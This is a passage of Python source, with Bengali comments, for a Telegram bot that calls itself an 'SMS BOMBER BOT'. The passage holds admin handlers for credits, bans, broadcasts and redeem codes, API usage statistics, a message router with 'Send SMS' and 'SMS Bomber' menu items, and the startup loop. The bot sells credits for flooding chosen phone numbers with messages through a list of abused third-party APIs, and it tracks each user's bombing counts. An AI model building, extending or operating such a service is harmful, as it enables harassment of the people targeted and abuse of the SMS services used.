            target_id = int(parts[0])
            amount = int(parts[1])
            
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, target_id))
                await db.commit()
            
            await admin_log(user_id, "Removed Credit", target_id, f"{amount} credits")
            await update.message.reply_text(f"✅ Removed {amount} credits from {target_id}!", reply_markup=get_admin_keyboard())
            context.user_data['admin_state'] = None
        except:
            await update.message.reply_text("❌ Invalid format! Use: `ID AMOUNT`", parse_mode="Markdown")
    
    elif state == 'ban_user':
        try:
            target_id = int(message.strip())
            
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET status = 'banned' WHERE user_id = ?", (target_id,))
                await db.commit()
            
            await admin_log(user_id, "Banned User", target_id)
            await update.message.reply_text(f"🚫 User {target_id} banned!", reply_markup=get_admin_keyboard())
            context.user_data['admin_state'] = None
        except:
            await update.message.reply_text("❌ Invalid ID!", reply_markup=get_admin_keyboard())
    
    elif state == 'unban_user':
        try:
            target_id = int(message.strip())
            
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET status = 'active' WHERE user_id = ?", (target_id,))
                await db.commit()
            
            await admin_log(user_id, "Unbanned User", target_id)
            await update.message.reply_text(f"✅ User {target_id} unbanned!", reply_markup=get_admin_keyboard())
            context.user_data['admin_state'] = None
        except:
            await update.message.reply_text("❌ Invalid ID!", reply_markup=get_admin_keyboard())
    
    elif state == 'broadcast':
        broadcast_text = message
        
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT user_id FROM users WHERE status = 'active'") as cur:
                users = await cur.fetchall()
        
        await update.message.reply_text(f"⏳ Broadcasting to {len(users)} users...")
        
        success = 0
        for user in users:
            try:
                await context.bot.send_message(
                    user[0],
                    f"📢 **Admin Broadcast**\n\n{broadcast_text}",
                    parse_mode='Markdown'
                )
                success += 1
                await asyncio.sleep(0.05)
            except:
                pass
        
        await admin_log(user_id, "Broadcast", None, f"Sent to {success} users")
        await update.message.reply_text(f"✅ Broadcast sent to {success} users!", reply_markup=get_admin_keyboard())
        context.user_data['admin_state'] = None
    
    elif state == 'create_code':
        try:
            parts = message.split()
            code = parts[0].upper()
            amount = int(parts[1])
            usages = int(parts[2])
            
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute(
                    "INSERT INTO redeem_codes (code, amount, usages, created_by) VALUES (?, ?, ?, ?)",
                    (code, amount, usages, user_id)
                )
                await db.commit()
            
            await admin_log(user_id, "Created Code", None, f"{code}: {amount}x{usages}")
            await update.message.reply_text(
                f"✅ Code Created!\n"
                f"🎟️ {code}\n"
                f"💰 {amount} Credits\n"
                f"👥 {usages} Uses",
                reply_markup=get_admin_keyboard()
            )
            context.user_data['admin_state'] = None
        except:
            await update.message.reply_text(
                "❌ Invalid format!\nUse: `CODE AMOUNT USAGES`",
                parse_mode="Markdown"
            )

# ===================== অ্যাডমিন লাইভ স্ট্যাটাস =====================
async def admin_live_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT COUNT(*) FROM api_usage") as cur:
            total_calls = await cur.fetchone()
        
        async with db.execute("SELECT COUNT(*) FROM api_usage WHERE DATE(usage_time) = DATE('now')") as cur:
            today_calls = await cur.fetchone()
        
        async with db.execute("SELECT COUNT(*) FROM api_usage WHERE success = 1") as cur:
            total_success = await cur.fetchone()
        
        async with db.execute("SELECT COUNT(*) FROM api_usage WHERE success = 0") as cur:
            total_failed = await cur.fetchone()
        
        async with db.execute("SELECT api_name, total_success, total_failed FROM api_stats ORDER BY total_success DESC LIMIT 5") as cur:
            top_apis = await cur.fetchall()
        
        async with db.execute("SELECT COUNT(DISTINCT user_id) FROM api_usage WHERE usage_time > datetime('now', '-1 hour')") as cur:
            active_users = await cur.fetchone()
    
    response = (
        f"📊 **LIVE API STATS**\n"
        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"{'━' * 20}\n\n"
        f"📈 **Overview:**\n"
        f"├─ Total API Calls: {total_calls[0]}\n"
        f"├─ Today's Calls: {today_calls[0]}\n"
        f"├─ Active Users (1h): {active_users[0]}\n"
        f"├─ ✅ Success: {total_success[0]}\n"
        f"└─ ❌ Failed: {total_failed[0]}\n\n"
        f"🏆 **Top 5 APIs:**\n"
    )
    
    for i, api in enumerate(top_apis, 1):
        total = api[1] + api[2]
        success_rate = round((api[1] / total) * 100, 2) if total > 0 else 0
        response += f"{i}. {api[0]}: ✅{api[1]} ❌{api[2]} ({success_rate}%)\n"
    
    response += f"\n📊 **API Limits:**\n"
    response += f"├─ Daily Limit: {API_LIMITS['daily_limit']}\n"
    response += f"├─ Per User: {API_LIMITS['per_user_limit']}\n"
    response += f"├─ Interval: {API_LIMITS['api_call_interval']}s\n"
    response += f"└─ Max Retries: {API_LIMITS['max_retries']}\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

# ===================== অ্যাডমিন API স্ট্যাটস =====================
async def admin_api_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT api_name, total_calls, total_success, total_failed, last_used FROM api_stats ORDER BY total_calls DESC"
        ) as cur:
            all_apis = await cur.fetchall()
    
    if not all_apis:
        await update.message.reply_text("📊 No API stats yet!", reply_markup=get_admin_keyboard())
        return
    
    response = "📈 **API Statistics**\n"
    response += f"{'━' * 20}\n\n"
    
    for api in all_apis[:15]:
        success_rate = round((api[2] / api[1]) * 100, 2) if api[1] > 0 else 0
        response += f"📡 {api[0]}\n"
        response += f"   ├─ Calls: {api[1]}\n"
        response += f"   ├─ ✅ {api[2]} | ❌ {api[3]}\n"
        response += f"   ├─ Rate: {success_rate}%\n"
        response += f"   └─ Last: {api[4][:16]}\n\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

# ===================== অ্যাডমিন ইউজার লিস্ট =====================
async def admin_users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT user_id, username, balance, total_sms, total_bombing, status FROM users ORDER BY user_id DESC LIMIT 20"
        ) as cur:
            users = await cur.fetchall()
    
    if not users:
        await update.message.reply_text("👥 No users found!", reply_markup=get_admin_keyboard())
        return
    
    response = "👥 **Recent Users**\n"
    response += f"{'━' * 20}\n\n"
    
    for i, user in enumerate(users, 1):
        response += f"{i}. ID: `{user[0]}`\n"
        response += f"   👤 {user[1] or 'N/A'}\n"
        response += f"   💰 {user[2]} | 📨{user[3]} | 💣{user[4]}\n"
        response += f"   🚦 {user[5]}\n\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

# ===================== অ্যাডমিন API লিস্ট =====================
async def admin_api_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    response = "📡 **API List**\n"
    response += f"{'━' * 20}\n\n"
    response += f"📌 Total APIs: {len(WORKING_APIS)}\n\n"
    
    for i, api in enumerate(WORKING_APIS, 1):
        response += f"{i}. {api['name']}\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

# ===================== মেসেজ হ্যান্ডলার =====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message = update.message.text
    
    logger.info(f"📩 Message from {user_id}: {message}")
    
    # ===== অ্যাডমিন কমান্ড =====
    if user_id == ADMIN_ID:
        if message == "💰 Add Credit":
            await admin_add_credit(update, context)
            return
        elif message == "➖ Remove Credit":
            await admin_remove_credit(update, context)
            return
        elif message == "🚫 Ban User":
            await admin_ban_user(update, context)
            return
        elif message == "✅ Unban User":
            await admin_unban_user(update, context)
            return
        elif message == "📣 Broadcast":
            await admin_broadcast(update, context)
            return
        elif message == "🎟️ Create Code":
            await admin_create_code(update, context)
            return
        elif message == "💰 Total Balance":
            await admin_total_balance(update, context)
            return
        elif message == "🏆 Top Users":
            await admin_top_users(update, context)
            return
        elif message == "📤 Export Data":
            await admin_export_data(update, context)
            return
        elif message == "🔄 Reset Limits":
            await admin_reset_limits(update, context)
            return
        elif message == "🗑️ Clear Logs":
            await admin_clear_logs(update, context)
            return
        elif message == "📜 Admin Logs":
            await admin_logs(update, context)
            return
        elif message == "📊 Live Stats":
            await admin_live_stats(update, context)
            return
        elif message == "📈 API Stats":
            await admin_api_stats(update, context)
            return
        elif message == "👥 Users List":
            await admin_users_list(update, context)
            return
        elif message == "📋 API List":
            await admin_api_list(update, context)
            return
        elif message == "🔙 Back":
            await update.message.reply_text("🏠 Main Menu", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        
        # অ্যাডমিন স্টেট চেক
        if context.user_data.get('admin_state'):
            await admin_state_handler(update, context)
            return
    
    # ===== ব্যাক =====
    if message == "🔙 Back":
        await update.message.reply_text("🏠 **Main Menu**", parse_mode="Markdown", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    # ===== মেইন মেনু =====
    if message == "📨 Send SMS":
        await cmd_sms(update, context)
        return
    
    if message == "💣 SMS Bomber":
        await cmd_bomber(update, context)
        return
    
    if message == "👤 My Profile":
        await profile(update, context)
        return
    
    if message == "🎁 Redeem Code":
        await redeem(update, context)
        return
    
    if message == "📊 My Stats":
        await stats(update, context)
        return
    
    if message == "📞 Contact Admin":
        await contact(update, context)
        return
    
    # ===== স্টেট প্রসেস =====
    state = context.user_data.get('state')
    
    if state == 'sms_number':
        await sms_number(update, context)
        return
    elif state == 'sms_message':
        await sms_message(update, context)
        return
    elif state == 'bomber_number':
        await bomber_number(update, context)
        return
    elif state == 'bomber_amount':
        await bomber_amount(update, context)
        return
    elif state == 'redeem_code':
        await redeem_process(update, context)
        return
    
    await update.message.reply_text(
        "❌ **Please use the buttons below:**",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

# ===================== মেইন =====================
async def main():
    try:
        print("="*60)
        print("🔥 SMS BOMBER BOT STARTING...")
        print(f"✅ APIs Loaded: {len(WORKING_APIS)}")
        print(f"👑 Admin ID: {ADMIN_ID}")
        print(f"📁 Database: {DB_PATH}")
        print("="*60)
        
        await init_db()
        
        application = Application.builder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        await application.initialize()
        await application.start()
        await application.updater.start_polling()
        
        print("✅ Bot is RUNNING!")
        print("="*60)
        
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Error: {e}")
        logger.error(f"Main error: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⛔ Bot stopped!")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
